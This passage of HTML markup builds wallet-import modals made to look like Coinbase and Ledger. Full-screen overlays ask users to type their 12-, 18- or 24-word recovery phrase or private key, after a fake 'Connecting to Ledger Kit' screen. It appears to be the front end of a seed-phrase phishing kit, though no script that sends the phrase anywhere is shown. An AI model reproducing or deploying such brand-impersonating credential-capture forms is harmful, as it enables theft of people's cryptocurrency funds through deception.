              id="import-container-coinbase"
              class="scwtw-absolute scwtw-inset-0 scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-opacity-100"
            >
              <div class="scwtw-px-6 scwtw-py-6">
                <div
                  class="scwtw-flex scwtw-items-center scwtw-justify-start scwtw-mb-6"
                >
                  <button
                    class="hover:scwtw-opacity-80 scwtw-transition-opacity scwtw-duration-200"
                    type="button"
                    id="coinbase-close-button"
                  >
                    <svg
                      class="scwtw-w-6 scwtw-h-6 scwtw-text-[#242424] dark:scwtw-text-[#ededed]"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    >
                      <path d="m12 19-7-7 7-7"></path>
                      <path d="M19 12H5"></path>
                    </svg>
                  </button>
                </div>
                <div class="scwtw-flex scwtw-flex-col scwtw-h-full">
                  <div class="scwtw-mb-6">
                    <h3
                      class="scwtw-font-playfair scwtw-text-2xl scwtw-font-medium scwtw-text-[#20212f] dark:scwtw-text-[#f4f5ff] scwtw-mb-2 font-inter"
                    >
                      Import wallet
                    </h3>
                    <p
                      class="scwtw-font-playfair scwtw-text-base scwtw-font-normal scwtw-text-[#20212f] dark:scwtw-text-[#f4f5ff] font-inter"
                    >
                      Enter your wallet's 12-word recovery phrase or private
                      key. You can import any Ethereum, Solana, or Bitcoin
                      recovery phrase. Only Ethereum private keys are supported.
                    </p>
                  </div>
                  <div>
                    <input
                      class="scwtw-bg-transparent scwtw-p-4 font-inter scwtw-text-base scwtw-font-normal scwtw-text-[#20212f] dark:scwtw-text-[#f4f5ff] scwtw-border scwtw-border-[#20212f] dark:scwtw-border-[#5e646c] scwtw-w-full scwtw-rounded-[6px] scwtw-outline-none focus:scwtw-border-[#858585] dark:focus:scwtw-border-[#f4f5ff] scwtw-placeholder-[#20212f] dark:scwtw-placeholder-[#8a918c] scwtw-transition-all scwtw-duration-300 coinbase-import-input"
                      type="text"
                      id="coinbase-import-input"
                      placeholder="Recovery phrase or private key"
                    />
                  </div>
                  <div
                    class="scwtw-mt-4 scwtw-hidden"
                    id="coinbase-error-message"
                  >
                    <p
                      class="scwtw-text-[#f0616d] font-inter scwtw-text-[14px] scwtw-font-normal"
                    >
                      Enter a valid 12-word recovery phrase or 64-character
                      private key.
                    </p>
                  </div>
                  <div class="scwtw-my-4">
                    <a
                      class="scwtw-text-[#3773f5] font-inter scwtw-text-[16px] hover:scwtw-opacity-90 scwtw-cursor-pointer scwtw-transition-opacity scwtw-duration-300"
                      href="https://href.li/?https://www.coinbase.com/wallet/getting-started-extension#import-existing-wallet"
                      target="_blank"
                      >Where can I find it?</a
                    >
                  </div>

                  <div class="scwtw-mt-16">
                    <button
                      class="scwtw-bg-[#3773f5] dark:scwtw-bg-[#ffffff] scwtw-text-white dark:scwtw-text-[#20212f] scwtw-text-base scwtw-py-3.5 scwtw-w-full scwtw-font-semibold scwtw-rounded-full font-inter disabled:scwtw-opacity-50 disabled:scwtw-cursor-not-allowed hover:scwtw-opacity-90 scwtw-cursor-pointer scwtw-transition-opacity scwtw-duration-300 scwtw-opacity-50 scwtw-cursor-not-allowed"
                      id="coinbase-import-button"
                    >
                      Import wallet
                    </button>
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>

    <!-- ledger -->

    <div
      id="ledger-modal-overlay"
      style="display: none"
      class="ledger-modal-overlay scwtw-fixed scwtw-inset-0 scwtw-w-full scwtw-h-full scwtw-bg-[#12121280] scwtw-transition-opacity scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-auto scwtw-z-[2147483647] scwtw-opacity-100"
    ></div>
    <div
      class="ledger-modal connect-modal-parent scwtw-fixed scwtw-inset-0 scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-pointer-events-none scwtw-z-[2147483648] scwtw-opacity-100"
    >
      <div
        id="ledger-modal"
        style="display: none"
        class="ledger-modal-content scwtw-pointer-events-auto scwtw-flex scwtw-transition-all scwtw-duration-200 scwtw-ease-in-out scwtw-fixed scwtw-top-1/2 scwtw-left-1/2 -scwtw-translate-x-1/2 scwtw-w-full scwtw-h-full scwtw-max-full md:scwtw-top-1/2 md:scwtw-left-1/2 md:-scwtw-translate-x-1/2 md:-scwtw-translate-y-1/2 md:scwtw-max-w-[620px] md:scwtw-h-[550px] scwtw-rounded-[24px] scwtw-bg-[#ffffff] dark:scwtw-bg-[#121313] dark:scwtw-border dark:scwtw-border-[#292929] md:scwtw-overflow-y-hidden scwtw-overflow-y-auto -scwtw-translate-y-1/2"
      >
        <div class="scwtw-h-full scwtw-w-full">
          <div class="scwtw-relative scwtw-z-[2147483649] scwtw-h-full">
            <div
              id="ledger-container"
              class="scwtw-h-full scwtw-w-full scwtw-absolute scwtw-flex scwtw-flex-col scwtw-transition-opacity scwtw-duration-500 scwtw-z-[2147483648] scwtw-opacity-0 scwtw-hidden"
            >
              <div
                class="scwtw-flex-1 scwtw-flex scwtw-items-center scwtw-justify-center"
              >
                <div
                  class="scwtw-relative scwtw-flex scwtw-flex-col scwtw-items-center"
                >
                  <div class="scwtw-relative">
                    <div class="scwtw-relative scwtw-rounded-2xl scwtw-p-6">
                      <svg
                        class="scwtw-w-28 scwtw-h-28 scwtw-object-contain ledger-loading-image"
                        width="100"
                        height="100"
                        viewBox="0 0 100 100"
                        fill="none"
                        xmlns="http://www.w3.org/2000/svg"
                      >
                        <rect
                          width="100"
                          height="100"
                          rx="13"
                          fill="#FEE5FB"
                        ></rect>
                        <path
                          d="M65.7277 27H44.5023V55.3931H72.9884V34.3873C73 30.3988 69.7292 27 65.7277 27ZM37.9839 27H34.4231C30.4216 27 27 30.2486 27 34.3988V37.948H37.9839V27ZM27 44.5954H37.9839V55.5434H27V44.5954ZM62.0161 72.9884H65.5769C69.5784 72.9884 73 69.7399 73 65.5896V62.052H62.0161V72.9884ZM44.5023 62.052H55.4861V73H44.5023V62.052ZM27 62.052V65.6012C27 69.5896 30.2592 73 34.4231 73H37.9839V62.052H27Z"
                          fill="#333333"
                        ></path>
                      </svg>
                    </div>
                  </div>
                  <p
                    class="scwtw-mt-6 scwtw-text-[#202020] font-inter scwtw-font-normal dark:scwtw-text-[#ffffff] scwtw-text-[20px] connecting-loading-text"
                  >
                    Connecting to Ledger Kit
                  </p>
                </div>
              </div>
              <div
                class="scwtw-pb-8 scwtw-flex scwtw-items-center scwtw-justify-center"
              >
                <svg
                  class="scwtw-h-6 scwtw-w-auto"
                  width="494"
                  height="48"
                  viewBox="0 0 494 48"
                  fill="none"
                  xmlns="http://www.w3.org/2000/svg"
                >
                  <path
                    d="M245 24C245 10.745 255.055 0 267.459 0H324.541C336.945 0 347 10.745 347 24C347 37.255 336.945 48 324.541 48H267.459C255.055 48 245 37.255 245 24Z"
                    fill="#202020"
                  ></path>
                  <path
                    d="M315.106 29.874V18.786H317.064V20.458C317.768 19.226 319.198 18.5 320.782 18.5C323.18 18.5 324.852 20.018 324.852 22.966V29.874H322.916V23.076C322.916 21.14 321.816 20.128 320.21 20.128C318.472 20.128 317.064 21.514 317.064 23.472V29.874H315.106ZM302.761 29.874L300.715 18.786H302.563L304.015 27.938L305.929 21.91H307.755L309.647 27.872L311.121 18.786H312.969L310.923 29.874H308.723L306.853 24.11L304.961 29.874H302.761ZM294.113 30.16C290.747 30.16 288.767 27.652 288.767 24.33C288.767 21.03 290.747 18.5 294.113 18.5C297.479 18.5 299.459 21.03 299.459 24.33C299.459 27.652 297.479 30.16 294.113 30.16ZM294.113 28.532C296.533 28.532 297.457 26.464 297.457 24.308C297.457 22.174 296.533 20.128 294.113 20.128C291.693 20.128 290.769 22.174 290.769 24.308C290.769 26.464 291.693 28.532 294.113 28.532ZM281.842 30.16C278.586 30.16 276.54 27.674 276.54 24.33C276.54 21.008 278.586 18.5 281.842 18.5C284.592 18.5 287.012 20.062 286.748 24.836H278.542C278.696 26.882 279.642 28.554 281.842 28.554C283.316 28.554 284.284 27.652 284.614 26.618H286.55C286.242 28.466 284.504 30.16 281.842 30.16ZM278.586 23.362H284.856C284.702 21.14 283.668 20.106 281.842 20.106C279.84 20.106 278.85 21.558 278.586 23.362ZM267.148 29.874V18.786H269.15V20.656C269.854 19.424 271.064 18.786 272.318 18.786H274.98V20.656H272.164C270.404 20.656 269.15 21.8 269.15 24.022V29.874H267.148Z"
                    fill="white"
                  ></path>
                  <path
                    d="M360.496 16.6H362.938L365.82 24.608L368.702 16.6H371.144V32H369.208V19.966L366.7 26.632H364.94L362.432 19.966V32H360.496V16.6ZM377.879 32.286C376.764 32.286 375.862 31.9853 375.173 31.384C374.498 30.7827 374.161 29.9907 374.161 29.008C374.161 27.864 374.542 27.05 375.305 26.566C376.082 26.0673 377.05 25.7447 378.209 25.598L380.585 25.29C380.995 25.246 381.274 25.1213 381.421 24.916C381.567 24.7107 381.641 24.454 381.641 24.146V24.124C381.641 23.552 381.435 23.09 381.025 22.738C380.629 22.386 380.035 22.21 379.243 22.21C378.436 22.21 377.798 22.3933 377.329 22.76C376.874 23.112 376.603 23.6327 376.515 24.322H374.557C374.674 23.1927 375.151 22.298 375.987 21.638C376.823 20.9633 377.901 20.626 379.221 20.626C380.673 20.626 381.758 20.9707 382.477 21.66C383.21 22.3493 383.577 23.3247 383.577 24.586V29.954C383.577 30.086 383.621 30.196 383.709 30.284C383.797 30.3573 383.907 30.394 384.039 30.394H384.721V32H383.401C382.873 32 382.469 31.8827 382.191 31.648C381.912 31.3987 381.773 31.0613 381.773 30.636V30.372C381.318 31.0467 380.746 31.538 380.057 31.846C379.367 32.1393 378.641 32.286 377.879 32.286ZM378.385 30.702C379.367 30.702 380.152 30.372 380.739 29.712C381.34 29.052 381.641 28.1793 381.641 27.094V26.324C381.362 26.4707 380.988 26.5807 380.519 26.654L378.583 26.94C377.747 27.072 377.138 27.2993 376.757 27.622C376.375 27.93 376.185 28.3627 376.185 28.92C376.185 29.4773 376.383 29.9173 376.779 30.24C377.175 30.548 377.71 30.702 378.385 30.702ZM388.287 20.912H390.245V22.584C390.597 21.968 391.103 21.4913 391.763 21.154C392.438 20.802 393.171 20.626 393.963 20.626C395.195 20.626 396.178 21.0147 396.911 21.792C397.659 22.5547 398.033 23.6547 398.033 25.092V32H396.097V25.202C396.097 24.2633 395.848 23.5373 395.349 23.024C394.865 22.5107 394.212 22.254 393.391 22.254C392.819 22.254 392.291 22.4007 391.807 22.694C391.323 22.9727 390.942 23.3687 390.663 23.882C390.384 24.3807 390.245 24.9527 390.245 25.598V32H388.287V20.912ZM406 32.286C404.768 32.286 403.778 31.9047 403.03 31.142C402.296 30.3647 401.93 29.2573 401.93 27.82V20.912H403.888V27.71C403.888 28.6633 404.13 29.3967 404.614 29.91C405.098 30.4087 405.758 30.658 406.594 30.658C407.166 30.658 407.686 30.5187 408.156 30.24C408.64 29.9467 409.021 29.5433 409.3 29.03C409.593 28.5167 409.74 27.9447 409.74 27.314V20.912H411.676V32H409.74V30.328C409.373 30.944 408.86 31.428 408.2 31.78C407.54 32.1173 406.806 32.286 406 32.286ZM418.806 32.286C417.692 32.286 416.79 31.9853 416.1 31.384C415.426 30.7827 415.088 29.9907 415.088 29.008C415.088 27.864 415.47 27.05 416.232 26.566C417.01 26.0673 417.978 25.7447 419.136 25.598L421.512 25.29C421.923 25.246 422.202 25.1213 422.348 24.916C422.495 24.7107 422.568 24.454 422.568 24.146V24.124C422.568 23.552 422.363 23.09 421.952 22.738C421.556 22.386 420.962 22.21 420.17 22.21C419.364 22.21 418.726 22.3933 418.256 22.76C417.802 23.112 417.53 23.6327 417.442 24.322H415.484C415.602 23.1927 416.078 22.298 416.914 21.638C417.75 20.9633 418.828 20.626 420.148 20.626C421.6 20.626 422.686 20.9707 423.404 21.66C424.138 22.3493 424.504 23.3247 424.504 24.586V29.954C424.504 30.086 424.548 30.196 424.636 30.284C424.724 30.3573 424.834 30.394 424.966 30.394H425.648V32H424.328C423.8 32 423.397 31.8827 423.118 31.648C422.84 31.3987 422.7 31.0613 422.7 30.636V30.372C422.246 31.0467 421.674 31.538 420.984 31.846C420.295 32.1393 419.569 32.286 418.806 32.286ZM419.312 30.702C420.295 30.702 421.08 30.372 421.666 29.712C422.268 29.052 422.568 28.1793 422.568 27.094V26.324C422.29 26.4707 421.916 26.5807 421.446 26.654L419.51 26.94C418.674 27.072 418.066 27.2993 417.684 27.622C417.303 27.93 417.112 28.3627 417.112 28.92C417.112 29.4773 417.31 29.9173 417.706 30.24C418.102 30.548 418.638 30.702 419.312 30.702ZM428.775 30.394H433.065V18.206H429.567V16.6H435.023V30.394H439.291V32H428.775V30.394ZM456.302 16.6H458.304V24.52L464.728 16.6H467.148L461.846 22.936L467.412 32H465.168L460.526 24.52L458.304 27.204V32H456.302V16.6ZM469.835 30.35H473.971V22.562H470.275V20.912H475.973V30.35H480.087V32H469.835V30.35ZM473.883 16.6H476.083V19.02H473.883V16.6ZM489.329 32C488.376 32 487.672 31.7947 487.217 31.384C486.763 30.9587 486.535 30.2913 486.535 29.382V22.518H483.235V20.912H486.029C486.176 20.912 486.293 20.868 486.381 20.78C486.484 20.692 486.535 20.5747 486.535 20.428V17.238H488.471V20.912H492.849V22.518H488.471V29.118C488.471 29.5287 488.574 29.844 488.779 30.064C488.985 30.2693 489.322 30.372 489.791 30.372H493.333V32H489.329Z"
                    fill="#202020"
                  ></path>
                  <path
                    d="M0.628 11.8H10.708C12.124 11.8 13.408 12.124 14.56 12.772C15.712 13.396 16.612 14.296 17.26 15.472C17.908 16.624 18.232 17.944 18.232 19.432C18.232 20.92 17.908 22.24 17.26 23.392C16.612 24.544 15.712 25.444 14.56 26.092C13.408 26.716 12.124 27.028 10.708 27.028H3.904V37H0.628V11.8ZM10.096 24.328C11.536 24.328 12.676 23.884 13.516 22.996C14.38 22.084 14.812 20.896 14.812 19.432C14.812 17.944 14.38 16.756 13.516 15.868C12.676 14.98 11.536 14.536 10.096 14.536H3.904V24.328H10.096ZM31.4842 37.468C28.4842 37.468 26.1562 36.352 24.5002 34.12C22.8442 31.888 22.0162 28.648 22.0162 24.4C22.0162 20.152 22.8442 16.912 24.5002 14.68C26.1562 12.448 28.4842 11.332 31.4842 11.332C34.4842 11.332 36.8122 12.448 38.4682 14.68C40.1242 16.912 40.9522 20.152 40.9522 24.4C40.9522 28.648 40.1242 31.888 38.4682 34.12C36.8122 36.352 34.4842 37.468 31.4842 37.468ZM31.4842 34.624C33.5722 34.624 35.0962 33.772 36.0562 32.068C37.0402 30.34 37.5322 27.784 37.5322 24.4C37.5322 21.016 37.0402 18.472 36.0562 16.768C35.0962 15.04 33.5722 14.176 31.4842 14.176C29.3962 14.176 27.8602 15.04 26.8762 16.768C25.9162 18.472 25.4362 21.016 25.4362 24.4C25.4362 27.784 25.9162 30.34 26.8762 32.068C27.8602 33.772 29.3962 34.624 31.4842 34.624ZM43.8724 11.8H47.1124L48.9484 31.384L52.2964 18.676H55.3924L58.7404 31.348L60.5044 11.8H63.7444L61.0804 37H57.4804L53.8444 23.032L50.1364 37H46.5724L43.8724 11.8ZM68.1407 11.8H84.7007V14.572H71.4167V22.492H83.2247V25.156H71.4167V34.228H84.7007V37H68.1407V11.8ZM89.9249 11.8H99.5369C101.001 11.8 102.309 12.1 103.461 12.7C104.637 13.276 105.549 14.116 106.197 15.22C106.869 16.3 107.205 17.596 107.205 19.108C107.205 20.884 106.737 22.384 105.801 23.608C104.865 24.808 103.617 25.624 102.057 26.056L107.601 37H103.965L98.6009 26.38H93.2009V37H89.9249V11.8ZM98.9969 23.644C100.509 23.644 101.685 23.248 102.525 22.456C103.365 21.64 103.785 20.524 103.785 19.108C103.785 17.644 103.365 16.516 102.525 15.724C101.685 14.932 100.509 14.536 98.9969 14.536H93.2009V23.644H98.9969ZM112.789 11.8H129.349V14.572H116.065V22.492H127.873V25.156H116.065V34.228H129.349V37H112.789V11.8ZM134.573 11.8H141.485C143.741 11.8 145.709 12.34 147.389 13.42C149.069 14.5 150.353 16 151.241 17.92C152.153 19.816 152.609 21.976 152.609 24.4C152.609 26.824 152.153 28.996 151.241 30.916C150.353 32.812 149.069 34.3 147.389 35.38C145.709 36.46 143.741 37 141.485 37H134.573V11.8ZM141.305 34.228C143.753 34.228 145.673 33.34 147.065 31.564C148.457 29.788 149.153 27.4 149.153 24.4C149.153 21.4 148.457 19.012 147.065 17.236C145.673 15.46 143.753 14.572 141.305 14.572H137.849V34.228H141.305ZM179.222 11.8H188.726C190.766 11.8 192.434 12.34 193.73 13.42C195.05 14.476 195.71 15.964 195.71 17.884C195.71 19.276 195.29 20.5 194.45 21.556C193.61 22.612 192.518 23.344 191.174 23.752C192.95 24.064 194.366 24.784 195.422 25.912C196.478 27.04 197.006 28.408 197.006 30.016C197.006 31.312 196.67 32.488 195.998 33.544C195.326 34.6 194.366 35.44 193.118 36.064C191.87 36.688 190.418 37 188.762 37H179.222V11.8ZM188.33 34.264C189.842 34.264 191.09 33.868 192.074 33.076C193.082 32.26 193.586 31.12 193.586 29.656C193.586 28.36 193.106 27.304 192.146 26.488C191.186 25.672 189.962 25.264 188.474 25.264H182.498V34.264H188.33ZM187.934 22.636C189.254 22.636 190.322 22.216 191.138 21.376C191.954 20.536 192.362 19.516 192.362 18.316C192.362 17.14 192.002 16.216 191.282 15.544C190.562 14.872 189.506 14.536 188.114 14.536H182.498V22.636H187.934ZM208.458 27.244L199.854 11.8H203.562L210.078 24.22L216.594 11.8H220.302L211.698 27.244V37H208.458V27.244Z"
                    fill="#202020"
                  ></path>
                </svg>
              </div>
            </div>
            <div
              id="import-container-ledger"
              class="scwtw-z-[2147483648] scwtw-transition-opacity scwtw-duration-500 scwtw-px-6 scwtw-py-8 scwtw-opacity-100"
            >
              <div class="scwtw-flex scwtw-items-center scwtw-justify-between">
                <div>
                  <svg
                    class="scwtw-h-[35px] scwtw-w-auto"
                    width="249"
                    height="48"
                    viewBox="0 0 249 48"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    <path
                      d="M0 24C0 10.745 10.055 0 22.459 0H79.541C91.945 0 102 10.745 102 24C102 37.255 91.945 48 79.541 48H22.459C10.055 48 0 37.255 0 24Z"
                      fill="#202020"
                    ></path>
                    <path
                      d="M70.1064 29.874V18.786H72.0644V20.458C72.7684 19.226 74.1984 18.5 75.7824 18.5C78.1804 18.5 79.8524 20.018 79.8524 22.966V29.874H77.9164V23.076C77.9164 21.14 76.8164 20.128 75.2104 20.128C73.4724 20.128 72.0644 21.514 72.0644 23.472V29.874H70.1064ZM57.7614 29.874L55.7154 18.786H57.5634L59.0154 27.938L60.9294 21.91H62.7554L64.6474 27.872L66.1214 18.786H67.9694L65.9234 29.874H63.7234L61.8534 24.11L59.9614 29.874H57.7614ZM49.1134 30.16C45.7474 30.16 43.7674 27.652 43.7674 24.33C43.7674 21.03 45.7474 18.5 49.1134 18.5C52.4794 18.5 54.4594 21.03 54.4594 24.33C54.4594 27.652 52.4794 30.16 49.1134 30.16ZM49.1134 28.532C51.5334 28.532 52.4574 26.464 52.4574 24.308C52.4574 22.174 51.5334 20.128 49.1134 20.128C46.6934 20.128 45.7694 22.174 45.7694 24.308C45.7694 26.464 46.6934 28.532 49.1134 28.532ZM36.8424 30.16C33.5864 30.16 31.5404 27.674 31.5404 24.33C31.5404 21.008 33.5864 18.5 36.8424 18.5C39.5924 18.5 42.0124 20.062 41.7484 24.836H33.5424C33.6964 26.882 34.6424 28.554 36.8424 28.554C38.3164 28.554 39.2844 27.652 39.6144 26.618H41.5504C41.2424 28.466 39.5044 30.16 36.8424 30.16ZM33.5864 23.362H39.8564C39.7024 21.14 38.6684 20.106 36.8424 20.106C34.8404 20.106 33.8504 21.558 33.5864 23.362ZM22.1484 29.874V18.786H24.1504V20.656C24.8544 19.424 26.0644 18.786 27.3184 18.786H29.9804V20.656H27.1644C25.4044 20.656 24.1504 21.8 24.1504 24.022V29.874H22.1484Z"
                      fill="white"
                    ></path>
                    <path
                      d="M115.496 16.6H117.938L120.82 24.608L123.702 16.6H126.144V32H124.208V19.966L121.7 26.632H119.94L117.432 19.966V32H115.496V16.6ZM132.879 32.286C131.764 32.286 130.862 31.9853 130.173 31.384C129.498 30.7827 129.161 29.9907 129.161 29.008C129.161 27.864 129.542 27.05 130.305 26.566C131.082 26.0673 132.05 25.7447 133.209 25.598L135.585 25.29C135.995 25.246 136.274 25.1213 136.421 24.916C136.567 24.7107 136.641 24.454 136.641 24.146V24.124C136.641 23.552 136.435 23.09 136.025 22.738C135.629 22.386 135.035 22.21 134.243 22.21C133.436 22.21 132.798 22.3933 132.329 22.76C131.874 23.112 131.603 23.6327 131.515 24.322H129.557C129.674 23.1927 130.151 22.298 130.987 21.638C131.823 20.9633 132.901 20.626 134.221 20.626C135.673 20.626 136.758 20.9707 137.477 21.66C138.21 22.3493 138.577 23.3247 138.577 24.586V29.954C138.577 30.086 138.621 30.196 138.709 30.284C138.797 30.3573 138.907 30.394 139.039 30.394H139.721V32H138.401C137.873 32 137.469 31.8827 137.191 31.648C136.912 31.3987 136.773 31.0613 136.773 30.636V30.372C136.318 31.0467 135.746 31.538 135.057 31.846C134.367 32.1393 133.641 32.286 132.879 32.286ZM133.385 30.702C134.367 30.702 135.152 30.372 135.739 29.712C136.34 29.052 136.641 28.1793 136.641 27.094V26.324C136.362 26.4707 135.988 26.5807 135.519 26.654L133.583 26.94C132.747 27.072 132.138 27.2993 131.757 27.622C131.375 27.93 131.185 28.3627 131.185 28.92C131.185 29.4773 131.383 29.9173 131.779 30.24C132.175 30.548 132.71 30.702 133.385 30.702ZM143.287 20.912H145.245V22.584C145.597 21.968 146.103 21.4913 146.763 21.154C147.438 20.802 148.171 20.626 148.963 20.626C150.195 20.626 151.178 21.0147 151.911 21.792C152.659 22.5547 153.033 23.6547 153.033 25.092V32H151.097V25.202C151.097 24.2633 150.848 23.5373 150.349 23.024C149.865 22.5107 149.212 22.254 148.391 22.254C147.819 22.254 147.291 22.4007 146.807 22.694C146.323 22.9727 145.942 23.3687 145.663 23.882C145.384 24.3807 145.245 24.9527 145.245 25.598V32H143.287V20.912ZM161 32.286C159.768 32.286 158.778 31.9047 158.03 31.142C157.296 30.3647 156.93 29.2573 156.93 27.82V20.912H158.888V27.71C158.888 28.6633 159.13 29.3967 159.614 29.91C160.098 30.4087 160.758 30.658 161.594 30.658C162.166 30.658 162.686 30.5187 163.156 30.24C163.64 29.9467 164.021 29.5433 164.3 29.03C164.593 28.5167 164.74 27.9447 164.74 27.314V20.912H166.676V32H164.74V30.328C164.373 30.944 163.86 31.428 163.2 31.78C162.54 32.1173 161.806 32.286 161 32.286ZM173.806 32.286C172.692 32.286 171.79 31.9853 171.1 31.384C170.426 30.7827 170.088 29.9907 170.088 29.008C170.088 27.864 170.47 27.05 171.232 26.566C172.01 26.0673 172.978 25.7447 174.136 25.598L176.512 25.29C176.923 25.246 177.202 25.1213 177.348 24.916C177.495 24.7107 177.568 24.454 177.568 24.146V24.124C177.568 23.552 177.363 23.09 176.952 22.738C176.556 22.386 175.962 22.21 175.17 22.21C174.364 22.21 173.726 22.3933 173.256 22.76C172.802 23.112 172.53 23.6327 172.442 24.322H170.484C170.602 23.1927 171.078 22.298 171.914 21.638C172.75 20.9633 173.828 20.626 175.148 20.626C176.6 20.626 177.686 20.9707 178.404 21.66C179.138 22.3493 179.504 23.3247 179.504 24.586V29.954C179.504 30.086 179.548 30.196 179.636 30.284C179.724 30.3573 179.834 30.394 179.966 30.394H180.648V32H179.328C178.8 32 178.397 31.8827 178.118 31.648C177.84 31.3987 177.7 31.0613 177.7 30.636V30.372C177.246 31.0467 176.674 31.538 175.984 31.846C175.295 32.1393 174.569 32.286 173.806 32.286ZM174.312 30.702C175.295 30.702 176.08 30.372 176.666 29.712C177.268 29.052 177.568 28.1793 177.568 27.094V26.324C177.29 26.4707 176.916 26.5807 176.446 26.654L174.51 26.94C173.674 27.072 173.066 27.2993 172.684 27.622C172.303 27.93 172.112 28.3627 172.112 28.92C172.112 29.4773 172.31 29.9173 172.706 30.24C173.102 30.548 173.638 30.702 174.312 30.702ZM183.775 30.394H188.065V18.206H184.567V16.6H190.023V30.394H194.291V32H183.775V30.394ZM211.302 16.6H213.304V24.52L219.728 16.6H222.148L216.846 22.936L222.412 32H220.168L215.526 24.52L213.304 27.204V32H211.302V16.6ZM224.835 30.35H228.971V22.562H225.275V20.912H230.973V30.35H235.087V32H224.835V30.35ZM228.883 16.6H231.083V19.02H228.883V16.6ZM244.329 32C243.376 32 242.672 31.7947 242.217 31.384C241.763 30.9587 241.535 30.2913 241.535 29.382V22.518H238.235V20.912H241.029C241.176 20.912 241.293 20.868 241.381 20.78C241.484 20.692 241.535 20.5747 241.535 20.428V17.238H243.471V20.912H247.849V22.518H243.471V29.118C243.471 29.5287 243.574 29.844 243.779 30.064C243.985 30.2693 244.322 30.372 244.791 30.372H248.333V32H244.329Z"
                      fill="#202020"
                    ></path>
                  </svg>
                </div>
                <div>
                  <button
                    class="scwtw-p-1 scwtw-rounded-[12px] hover:scwtw-bg-[#f3f3f3] dark:hover:scwtw-bg-[#eaeaea0d] scwtw-transition-all scwtw-duration-300 active:scwtw-scale-95"
                    type="button"
                    id="ledger-close-button1"
                  >
                    <svg
                      class="scwtw-w-6 scwtw-h-6 scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                      xmlns="http://www.w3.org/2000/svg"
                      width="24"
                      height="24"
                      viewBox="0 0 24 24"
                      fill="none"
                      stroke="currentColor"
                      stroke-width="2"
                      stroke-linecap="round"
                      stroke-linejoin="round"
                    >
                      <path d="M18 6 6 18"></path>
                      <path d="m6 6 12 12"></path>
                    </svg>
                  </button>
                </div>
              </div>
              <div class="scwtw-mt-6">
                <div
                  class="scwtw-flex scwtw-flex-col scwtw-items-start scwtw-justify-start scwtw-text-start scwtw-gap-y-1.5"
                >
                  <div>
                    <h3
                      class="scwtw-text-[#202020] dark:scwtw-text-[#ffffff] font-inter scwtw-font-bold scwtw-text-[22px]"
                    >
                      Import Ledger wallet with Secret Phrase
                    </h3>
                  </div>
                  <div class="scwtw-mb-1.5">
                    <p
                      class="scwtw-text-[#141618] dark:scwtw-text-[#dddddd] font-inter scwtw-font-normal scwtw-text-[16px]"
                    >
                      Import an existing wallet with your 12, 18 or 24-word
                      secret phrase.
                    </p>
                  </div>
                  <div
                    class="scwtw-flex scwtw-w-full scwtw-items-center scwtw-p-1 scwtw-gap-x-1.5 scwtw-border scwtw-border-[#ebebeb] dark:scwtw-border-[#3e3e3e] scwtw-rounded-[16px]"
                  >
                    <div class="scwtw-w-full">
                      <button
                        class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-w-full scwtw-p-2 scwtw-rounded-[16px] scwtw-border scwtw-border-transparent scwtw-bg-[#f3f3f3] dark:scwtw-bg-[#ffffff05] hover:scwtw-opacity-80 scwtw-cursor-pointer scwtw-text-center scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 data-[is-selected=true]:scwtw-border-[#7b7b7b] dark:data-[is-selected=true]:scwtw-border-[#a5a5a5] ledger-switch-words-count-button"
                        id="ledger-switch-words-count-button-12"
                        data-is-selected="true"
                        data-words-count="12"
                      >
                        <div>
                          <span
                            class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                            >12 words</span
                          >
                        </div>
                      </button>
                    </div>
                    <div class="scwtw-w-full">
                      <button
                        class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-w-full scwtw-p-2 scwtw-rounded-[16px] scwtw-border scwtw-border-transparent scwtw-bg-[#f3f3f3] dark:scwtw-bg-[#ffffff05] hover:scwtw-opacity-80 scwtw-cursor-pointer scwtw-text-center scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 data-[is-selected=true]:scwtw-border-[#7b7b7b] dark:data-[is-selected=true]:scwtw-border-[#a5a5a5] ledger-switch-words-count-button"
                        id="ledger-switch-words-count-button-18"
                        data-is-selected="false"
                        data-words-count="18"
                      >
                        <div>
                          <span
                            class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                            >18 words</span
                          >
                        </div>
                      </button>
                    </div>
                    <div class="scwtw-w-full">
                      <button
                        class="scwtw-flex scwtw-items-center scwtw-justify-center scwtw-w-full scwtw-p-2 scwtw-rounded-[16px] scwtw-border scwtw-border-transparent scwtw-bg-[#f3f3f3] dark:scwtw-bg-[#ffffff05] hover:scwtw-opacity-80 scwtw-cursor-pointer scwtw-text-center scwtw-transition-all scwtw-duration-400 active:scwtw-scale-[0.98] disabled:scwtw-cursor-not-allowed disabled:scwtw-opacity-80 data-[is-selected=true]:scwtw-border-[#7b7b7b] dark:data-[is-selected=true]:scwtw-border-[#a5a5a5] ledger-switch-words-count-button"
                        id="ledger-switch-words-count-button-24"
                        data-is-selected="false"
                        data-words-count="24"
                      >
                        <div>
                          <span
                            class="scwtw-font-normal scwtw-text-base scwtw-text-[#202020] dark:scwtw-text-[#ffffff]"
                            >24 words</span
                          >
                        </div>
                      </button>
                    </div>
                  </div>
                </div>
              </div>
              <div class="scwtw-mt-4">
                <div
                  class="scwtw-mt-4 scwtw-max-h-[204px] scwtw-overflow-y-auto ledger-custom-scrollbar"
                >
                  <div
                    id="ledger-12"
                    class="ledger-container-12-words scwtw-grid scwtw-grid-cols-3 scwtw-gap-1"
                  >
                    <div class="scwtw-relative">
                      <div
                        class="scwtw-absolute scwtw-left-[16px] scwtw-top-[12px]"
                      >
